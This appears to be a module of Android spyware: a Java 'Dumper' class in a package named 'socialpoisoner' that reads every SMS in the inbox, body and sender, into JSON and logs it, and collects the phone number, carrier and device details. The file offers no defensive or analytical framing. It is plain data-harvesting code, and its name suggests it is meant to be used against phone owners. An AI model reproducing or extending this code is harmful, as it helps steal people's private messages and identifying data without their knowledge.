package com.cakeman.doctorrabb.socialpoisoner.modules;

import android.Manifest;
import android.content.Context;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.net.Uri;
import android.os.Build;
import android.support.v4.app.ActivityCompat;
import android.telephony.TelephonyManager;
import android.util.Log;

import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

import java.util.Properties;

/**
 * Created by doctorrabb on 15.07.16.
 */
public class Dumper {
    public JSONArray dumpSMS (Context context) {

        if (ActivityCompat.checkSelfPermission(context, Manifest.permission.READ_SMS) == PackageManager.PERMISSION_GRANTED) {

            Cursor cursor = context.getContentResolver().query(Uri.parse("content://sms/inbox"), null, null, null, null);

            JSONArray jsonObject = new JSONArray();
            cursor.moveToFirst();

            while (cursor.moveToNext()) {
                String body = cursor.getString(cursor.getColumnIndex("body")).toString();
                String address = cursor.getString(cursor.getColumnIndex("address")).toString();

                try {
                    jsonObject.put(new JSONObject().put("body", body).put("address", address));
                } catch (JSONException e) {
                    return null;
                }
            }

            cursor.close();

            Log.d ("SMS JSON List", jsonObject.toString());

            return jsonObject;

        }
        return null;
    }

    public JSONObject dumpInfo (Context context) {
        JSONObject properties = new JSONObject ();
        TelephonyManager telephonyManager = (TelephonyManager) context.getSystemService(Context.TELEPHONY_SERVICE);

        try {
            properties.put("phone_number", telephonyManager.getLine1Number());
            properties.put("mobile_operator", telephonyManager.getNetworkOperatorName());

            properties.put("device_model", Build.MODEL);
            properties.put("android_version", Build.VERSION.RELEASE);
            properties.put("android_version_codename", Build.VERSION.CODENAME);
        } catch (Exception e) {
            Log.e ("Get Information Error", e.getMessage());
        }

        return properties;

    }

}
